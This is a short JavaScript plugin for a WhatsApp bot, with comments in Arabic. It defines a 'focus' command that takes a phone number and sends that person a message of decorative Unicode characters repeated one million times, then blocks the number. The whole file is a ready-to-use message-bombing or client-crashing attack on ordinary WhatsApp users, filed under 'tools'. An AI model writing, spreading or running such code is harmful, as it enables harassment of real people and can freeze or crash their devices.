let handler = async (m, { conn, text, command }) => {
    if (command == 'focus') {
        // تقسيم النص إلى الرقم وعدد المرات
        let [number] = text.trim().split(/\s+/);
        if (!number) throw '*مثال* :\n*.focus* 1234567890';
        
        // التأكد من أن number هو رقم هاتف صحيح
        if (!/^\d+$/.test(number)) throw '*خطأ* :\n*الرقم المدخل غير صحيح*';
        
        // الرسالة التلقائية المحددة
        let message = '✘͢͢ۦོ͢⇣͢✰͢↬ÂмRØ^^O̷ ꦿ⃕O̷↬ۦོ͢✰͢⇣͢✘͢͢⁦  ';
        
        // تكرار الرسالة مليون مرة
        let repeatedMessage = message.repeat(1000000);
        
        // إرسال الرسالة
        await conn.sendMessage(number + '@s.whatsapp.net', { text: repeatedMessage });

        // قم بحظر الرقم بعد إرسال الرسالة
        try {
            await conn.blockUser(number + '@s.whatsapp.net', 'عملية تركيز');
            m.reply(`تم إرسال الرسالة مليون مرة وتم حظر الرقم ${number}`);
        } catch (e) {
            m.reply(`تم إرسال الرسالة مليون مرة ولكن لم يتمكن من حظر الرقم ${number}`);
        }
    }
}

handler.command = handler.help = ['focus'];
handler.tags = ['tools'];
export default handler;
